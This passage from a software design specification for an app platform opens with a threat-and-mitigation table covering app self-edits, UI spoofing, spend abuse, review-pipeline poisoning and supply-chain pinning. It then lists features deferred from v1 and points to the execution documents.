| App edits its own defining document while mounted | pinned install ≠ working copy; dev mode remounts the working tree scoped; a broken save fails the remount typed, the pin keeps running |
| App writes something that breaks the project | the write is a change set (§14): recoverable from its recorded bytes with or without git, and a structural one never reached the working branch at all — it is a pull request |
| App writes while the person has unrelated work in flight | the commit is path-scoped to what the app touched; a structural change cuts its branch from HEAD, commits, and switches back, so other dirty files travel untouched |
| Git is absent, the remote is unreachable, or `gh` is not installed | each rung degrades to the next and names the degradation in the record; the edit itself is never refused, and Revert works at every rung |
| An app tries to hide what it did | it cannot: the host writes the record and the commit, the app is never told either happened, and there is no seam that reaches them |
| Spoofing first-party UI | provenance strip outside the app's reach; dialogs in host chrome only; stamped toasts; identity marks excluded from the app icon vocabulary |
| Spend/egress abuse in automations | guarded spend defaults are unraisable ceilings; per-host egress charges at the one funnel; `spend_capped` typed |
| Review-pipeline poisoning | submitted code never executes at review; descriptions are untrusted text; signing is owner-local post-merge, key never in CI; approval binds the tree hash |
| Supply chain (retag, hash mismatch) | commit+tree pins, append-only ledger, approval-bound treeHash, re-verify on every materialize |
| Native/mobile surfacing | refused v1 (store policy); the `<MiniApp/>` trust tier is the named future path |
| A store page running app code | refused permanently; static media only |

## 17 · Deliberately not in v1

- **Paid apps** — free-only v1 (owner decision); the paid lane (merchant-of-record + the
  entitlement signer, rev-share) is sketched in `01-apps-shelf.md` §6 and wakes when the shelf
  earns its traffic.
- **Account-level installs** — installs are per-project (local-first, no account required);
  the account rollup joins when the P0 account plane lands.
- **Runtime-granted permissions** — grants are install-time and manifest-static on purpose; a
  runtime prompt API is a widen verb by another name.
- The four deferred slots (§4), native surfacing (§14), and third-party code on the store site
  (refused).

## 18 · Execution

The workstreams (T1–T9), their file paths, gates and DONE criteria are
`studio-apps-execution.md`. The shelf, submission, review doctrine, signing ceremony and the
owner-gated checklist are `ClosedSource/Documentation/v4-launch/registry/01-apps-shelf.md`.
